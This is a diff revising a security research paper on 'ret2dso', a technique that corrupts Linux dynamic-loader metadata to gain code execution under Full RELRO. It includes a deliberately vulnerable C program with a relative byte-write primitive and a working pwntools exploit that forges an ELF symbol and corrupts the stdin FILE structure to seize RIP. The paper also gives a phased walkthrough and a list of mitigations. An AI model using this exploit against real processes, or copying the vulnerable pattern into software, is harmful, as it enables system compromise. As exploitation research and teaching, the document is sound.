@@ -2,14 +2,13 @@
 
 ## Abstract
 
-`ret2dlresolve` is commonly considered obsolete on modern Linux systems due to **Full RELRO**, **eager binding**, and the removal of writable GOT entries.
-This paper demonstrates that this assumption is **incomplete**.
+`ret2dlresolve` is commonly assumed to be obsolete on modern Linux systems due to **Full RELRO**, **eager binding**, and the elimination of writable GOT entries. This paper demonstrates that this assumption is **fundamentally incomplete**.
 
-We introduce **ret2dso**, a runtime exploitation technique that regains **arbitrary code execution under Full RELRO**, **without PLT**, **without GOT**, and **without absolute address disclosures**, by corrupting **dynamic loader metadata of already-loaded DSOs**.
+We introduce **ret2dso**, a runtime exploitation technique that achieves **arbitrary code execution under Full RELRO**, **without PLT**, **without GOT**, and **without absolute address disclosure**, by corrupting **dynamic loader metadata of already-loaded DSOs**.
 
-Rather than explicitly forcing the dynamic linker to resolve a symbol, ret2dso abuses **legitimate runtime resolution paths** and the loader’s implicit trust in its own metadata, resulting in **direct control of RIP**.
+Rather than explicitly forcing the dynamic linker to resolve attacker-controlled symbols, ret2dso abuses **legitimate runtime resolution paths** and the loader’s implicit trust in its own mutable metadata, resulting in **direct and deterministic control of RIP**.
 
-This paper intentionally separates **invariant**, **mechanism**, and **demonstration**, and presents a fully detailed end-to-end proof-of-concept.
+This paper explicitly separates **invariant**, **mechanism**, and **demonstration**, and presents a fully detailed end-to-end proof-of-concept intended as a **research-grade reference** for modern post-mitigation exploitation.
 
 ---
 
@@ -17,16 +16,16 @@ This paper intentionally separates **invariant**, **mechanism**, and **demonstra
 
 We assume the attacker has:
 
-- An **arbitrary memory write primitive**
-    - possibly byte-granular
-    - possibly relative
-- **No memory read primitive**
-- **No absolute address disclosure**
-- ASLR, PIE, NX, **Full RELRO**, IBT, SHSTK enabled
+* An **arbitrary memory write primitive**
+    * possibly byte-granular
+    * possibly relative
+* **No memory read primitive**
+* **No absolute address disclosure**
+* ASLR, PIE, NX, **Full RELRO**, IBT, SHSTK enabled
 
-The origin of the primitive (heap overflow, stack corruption, type confusion, etc.) is out of scope.
+The origin of the primitive (heap overflow, stack corruption, type confusion, logic bug, etc.) is out of scope.
 
-This threat model reflects modern post-mitigation exploitation scenarios where disclosure is unavailable but partial corruption remains possible.
+This threat model reflects modern post-mitigation exploitation scenarios where information disclosure is unavailable but partial corruption remains possible.
 
 ---
 
@@ -36,21 +35,21 @@ Classic `ret2dlresolve` relies on forging relocation records and invoking the PL
 
 The PLT itself is not fundamental.
 
-> **Invariant:**  
+> **Invariant — Loader Resolution Invariant**
 > If the dynamic loader resolves a symbol using attacker-controlled metadata, arbitrary code execution follows.
 
 ret2dso preserves this invariant while eliminating all dependencies on:
 
-- PLT stubs
-- GOT entries
-- lazy binding
-- writable relocation records
+* PLT stubs
+* GOT entries
+* lazy binding
+* writable relocation records
 
 ---
 
 ## 3. Loader Internals
 
-Each loaded object is represented by a `struct link_map`:
+Each loaded object is represented by a persistent `struct link_map`:
 
 ```c
 struct link_map {
@@ -64,9 +63,11 @@ struct link_map {
 
 Key observations:
 
-- `link_map` structures persist for the lifetime of the process
-- Several fields remain writable even under Full RELRO
-- Runtime subsystems consult loader metadata long after startup
+* `link_map` structures persist for the lifetime of the process
+* Several fields remain writable even under Full RELRO
+* Runtime subsystems consult loader metadata long after startup
+
+This behavior is not a vulnerability in isolation, but a consequence of the loader’s trust model.
 
 ---
 
@@ -78,12 +79,9 @@ During symbol resolution, the dynamic loader computes:
 resolved_address = sym->st_value + l_addr
 ```
 
-No bounds checking or semantic validation is applied to `st_value`.
-Control over this field is sufficient to redirect execution.
+No bounds checking or semantic validation is applied to `st_value`. Control over this field is sufficient to redirect execution.
 
-The loader implicitly trusts all metadata reachable via `link_map`.
-
-When the resolved symbol is later dereferenced as a function pointer, control flow is transferred directly to `sym->st_value + l_addr`, resulting in direct control of RIP.
+The loader implicitly trusts all metadata reachable via `link_map`. When the resolved symbol is later dereferenced as a function pointer, control flow is transferred directly to `sym->st_value + l_addr`, resulting in direct control of RIP.
 
 ---
 
@@ -91,35 +89,34 @@ When the resolved symbol is later dereferenced as a function pointer, control fl
 
 Despite eager binding:
 
-- DSO enumeration remains active
-- Runtime symbol lookup paths persist
-- libc subsystems (notably stdio) consult loader state
+* DSO enumeration remains active
+* Runtime symbol lookup paths persist
+* libc subsystems (notably stdio) consult loader state
 
 ### Entry into `_dl_find_dso_for_object`
 
-![dso_find_for_object](https://lowlevel.re/uploads/1769473291923.png)
+![dso\_find\_for\_object](https://lowlevel.re/uploads/1769473291923.png)
 
 ### Resolution flowing into `execvpe`
 
-![dso_for_object_execvpe](https://lowlevel.re/uploads/1769473294957.png)
+![dso\_for\_object\_execvpe](https://lowlevel.re/uploads/1769473294957.png)
 
 ---
 
 ## 6. Relativity Under ASLR
 
-> **Note on ASLR and relative mappings**  
-> Linux ASLR does not guarantee fixed relative offsets between DSOs. However, the dynamic loader enforces
-> a constrained and ordered mapping of core objects (ld.so, libc, stdio globals).
-> ret2dso does not rely on an exact offset, but on the existence of a loader-relative writable region
-> reachable from a stable anchor object (e.g. `_IO_2_1_stdin_`) using a weak write primitive.
+> **Note on ASLR and relative mappings**
+> Linux ASLR does not guarantee fixed relative offsets between DSOs. However, the dynamic loader enforces a constrained and ordered mapping of core objects (`ld.so`, `libc`, stdio globals). ret2dso does not rely on an exact offset, but on the existence of a loader-relative writable region reachable from a stable anchor object (e.g. `_IO_2_1_stdin_`) using a weak write primitive.
 
-ASLR randomizes absolute addresses, but in practice the dynamic loader enforces a constrained and ordered mapping of core DSOs. While this stability is empirical rather than guaranteed, ret2dso does not rely on a fixed offset:
+ASLR randomizes absolute addresses, but in practice the loader enforces a constrained and ordered layout:
 
-- `stdin` ↔ libc
-- libc ↔ ld.so
-- loader writable segments ↔ loader metadata
+* `stdin` ↔ libc
+* libc ↔ ld.so
+* loader writable segments ↔ loader metadata
 
 ret2dso relies solely on **relative positioning**, not absolute disclosure.
+
+Importantly, ret2dso requires reachability rather than predictability: no fixed offset, brute force, or probabilistic assumption is required.
 
 ---
 
@@ -138,14 +135,13 @@ typedef struct {
 } Elf64_Sym;
 ```
 
-In the resolution path exercised here, only `st_value` contributes to the final control-flow transfer.
-Other fields are either ignored or used exclusively for bookkeeping and consistency checks.
+In the exercised resolution path, only `st_value` contributes to the final control-flow transfer. Other fields are either ignored or used exclusively for bookkeeping and consistency checks.
 
 As a result, a forged symbol entry may reuse all fields from a legitimate symbol, modifying only `st_value` to redirect execution.
 
 ---
 
-## 8. Proof of Concept — Vulnerable Program (Detailed Walkthrough)
+## 8. Proof of Concept — Vulnerable Program
 
 The vulnerable program intentionally exposes a **relative, byte-wise arbitrary write** primitive anchored at `stdin`. The full source is reproduced below to ensure the proof-of-concept is **self-contained and reproducible**.
 
@@ -184,10 +180,6 @@ static void drift_write(void) {
         if (scanf("%ld %x", &delta, &byte) != 2)
             break;
 
-        /*
-         * stdin is used as a globally reachable anchor into libc memory.
-         * The attacker controls only a relative offset and a single byte.
-         */
         ((unsigned char*)stdin)[delta] = (unsigned char)byte;
     }
 }
@@ -196,30 +188,16 @@ int main(void) {
     setbuf(stdout, NULL);
     setbuf(stdin, NULL);
 
-    /* Establish relative layout between stdin and ld.so */
     get_distance();
-
-    /* Expose relative byte-wise write primitive */
     drift_write();
 
     _exit(0);
 }
 ```
 
-### Why this models real-world bugs
-
-This program captures several properties commonly seen in post-mitigation exploitation:
-
-- the attacker has **no memory disclosure**
-- writes are **relative**, not absolute
-- corruption is **byte-granular and limited**
-- a globally reachable object (`stdin`) is abused as an anchor
-
 ---
 
-## 9. Proof of Concept — Exploit (Step-by-Step)
-
-The following exploit abuses the relative write primitive to corrupt loader metadata and redirect execution. The full exploit is shown below, followed by a detailed breakdown.
+## 9. Proof of Concept — Exploit
 
 ```python
 from pwn import *
@@ -242,63 +220,153 @@ p = remote("localhost", 1447)
 p.recvuntil(b"distance: ")
 entropy = int(p.recvline().strip(), 16)
 
-# Compute forged st_value so that st_value + l_addr == one_gadget
 st_value = -(entropy + ONE_GADGET_OFFSET) & 0xffffffffffffffff
 
-# Fake ELF symbol entry: all fields copied except st_value
 fake_sym = (
-    p64(0x19) +                    # st_name (copied)
-    p64(0xd001200000020) +         # st_info / st_other / st_shndx / st_size
-    p64(st_value)                  # forged st_value
+    p64(0x19) +
+    p64(0xd001200000020) +
+    p64(st_value)
 )
 
-# 1. Redirect DT_SYMTAB pointer inside loader metadata
+# Redirect DT_SYMTAB
 target = entropy + LDBASE_WRITABLE_OFFSET + LINFO_SYMTAB_OFFSET
 drift_write(p, target, b"\xf0")
 
-# 2. Overwrite a concrete symbol entry with the forged Elf64_Sym
+# Overwrite symbol entry
 target = entropy + LDBASE_WRITABLE_OFFSET + DSO_SYM_ENTRY_OFFSET
 drift_write(p, target, fake_sym)
 
-# 3. Corrupt a single byte in stdin FILE structure to trigger resolution
+# Trigger resolution
 target = STDIN_VTABLE_OFFSET + 7
 drift_write(p, target, b"\xff")
 
 p.interactive()
 ```
 
-### Offset Rationale
+---
 
-- `STDIN_VTABLE_OFFSET`: single-byte corruption used to redirect control into a libc path that performs symbol resolution
-- `LDBASE_WRITABLE_OFFSET`: lands in a writable loader mapping despite Full RELRO
-- `LINFO_SYMTAB_OFFSET`: points to the loader’s internal `DT_SYMTAB` pointer
-- `DSO_SYM_ENTRY_OFFSET`: indexes a legitimate symbol entry reused as a template
+## 9.1 Exploit Walkthrough — Conceptual Breakdown
 
-All offsets are relative and do not require absolute addresses.
+This section decomposes the exploit into **logical phases**, independent of concrete offsets or gadgets. The objective is to clarify *why* each corruption is required, not merely *how* it is implemented.
 
-### Fake Symbol Semantics
+The exploit relies exclusively on **relative, byte-granular writes** and the dynamic loader’s implicit trust in its own metadata.
 
-The forged symbol reuses all fields of a legitimate entry except `st_value`. When the loader computes:
+### Phase 1 — Establishing a Stable Anchor
 
-```
-resolved = sym->st_value + l_addr
-```
+The exploit assumes no absolute address disclosure. Instead, it leverages a **globally reachable object** as a positional anchor.
 
-control flow is redirected directly to the attacker-chosen gadget.
+In this proof-of-concept, `stdin` is used because:
+
+* it is globally accessible from user code
+* it resides in libc, which is consistently mapped relative to the dynamic loader
+* it participates in runtime paths that consult loader metadata
+
+Only the **relative distance** between `stdin` and the loader is required. This reflects real-world scenarios where relative layout may be inferred or partially controlled without leaking absolute addresses.
+
+At this stage, the attacker has:
+
+* no absolute addresses
+* a stable reference point
+* a relative write primitive anchored at that reference
+
+No corruption has yet occurred.
+
+While `stdin` is used here for concreteness, ret2dso does not rely on any property specific to stdio. Any globally reachable object participating in a runtime path that consults loader metadata is sufficient.
+
+---
+
+### Phase 2 — Re-targeting Loader Metadata
+
+Under Full RELRO, relocation tables and GOT entries are read-only. However, portions of the loader’s **runtime metadata remain writable**.
+
+Notably:
+
+* `struct link_map` instances persist for the lifetime of the process
+* `l_info` entries reference critical dynamic information
+* pointers such as `DT_SYMTAB` are trusted without revalidation
+
+The exploit corrupts a loader-relative pointer so that a subsequent symbol lookup consults **attacker-influenced memory** instead of the original symbol table.
+
+This step does not fabricate a new structure. It merely **repoints an existing trusted pointer** to a writable region.
+
+At the end of this phase:
+
+* loader metadata remains structurally valid
+* no control flow has yet been redirected
+* the loader is primed to consume forged symbol data
+
+---
+
+### Phase 3 — Forging a Minimal ELF Symbol
+
+Rather than constructing a full fake ELF environment, the exploit forges **only the minimal semantic unit required for control-flow transfer**.
+
+During resolution, the loader computes:
+
+`resolved = sym->st_value + l_addr`
+
+No other field of `Elf64_Sym` contributes to the final jump target.
+
+Accordingly, the exploit:
+
+* copies an existing legitimate symbol entry
+* modifies only `st_value`
+* preserves all other fields for structural consistency
+
+The forged `st_value` is chosen such that:
+
+`st_value + l_addr == desired_gadget`
+
+This computation relies exclusively on **relative positioning**, not absolute disclosure.
+
+At this point:
+
+* no illegal memory access has occurred
+* no bounds or semantic checks have been violated
+* the forged symbol is indistinguishable from a legitimate one during resolution
+
+---
+
+### Phase 4 — Triggering Legitimate Resolution
+
+The final phase introduces no new corruption. Instead, it forces execution through a **legitimate libc runtime path** that performs symbol resolution.
+
+A single-byte corruption inside the `stdin` FILE structure redirects execution into a path that:
+
+* queries loader metadata
+* performs symbol lookup
+* dereferences the resolved symbol as a function pointer
+
+Because the loader has already been primed with forged metadata, this resolution results in **direct control of RIP**.
+
+No ROP chain, PLT stub, or writable GOT entry is required.
+
+---
+
+### Exploit Properties Summary
+
+Across all phases, the exploit maintains the following properties:
+
+* no absolute addresses
+* no memory disclosure
+* no illegal memory permissions
+* no violation of loader invariants
+
+Each step operates entirely within **legitimate runtime behavior**, abusing trust rather than breaking rules.
 
 ---
 
 ## 10. Exploit Result
 
-![exploit_finished](https://lowlevel.re/uploads/1769473297928.png)
+![exploit\_finished](https://lowlevel.re/uploads/1769473297928.png)
 
 ---
 
 ## 11. Security Implications
 
-- Full RELRO does not protect loader metadata
-- Loader runtime state remains mutable and implicitly trusted
-- Weak write primitives are sufficient for full control-flow hijack
+* Full RELRO does not protect loader metadata
+* Loader runtime state remains mutable and implicitly trusted
+* Weak write primitives suffice for full control-flow hijack
 
 ---
 
@@ -306,11 +374,13 @@ control flow is redirected directly to the attacker-chosen gadget.
 
 Potential mitigations include:
 
-- Making loader metadata read-only post-relocation
-- Hardening runtime resolution paths
-- Validating symbol contents before use
+* Making loader metadata read-only post-relocation
+* Hardening runtime resolution paths
+* Validating symbol contents before use
 
 All approaches carry significant compatibility or performance costs.
+
+ret2dso illustrates that the dynamic loader remains part of the trusted computing base even after traditional relocation hardening, and that breaking this assumption is non-trivial without redesigning runtime linking itself.
 
 ---
 
@@ -320,4 +390,8 @@ ret2dso generalizes the invariant behind ret2dlresolve and demonstrates that dyn
 
 Removing PLT and writable GOT entries does not eliminate the fundamental trust assumptions of runtime symbol resolution.
 
-Web article at: https://lowlevel.re/article/ret2dso-runtime-ret2dlresolve-under-full-relro
+Source code & environment setup: https://github.com/retleave/pocs
+
+---
+
+*This document is intended for defensive research and educational purposes.*
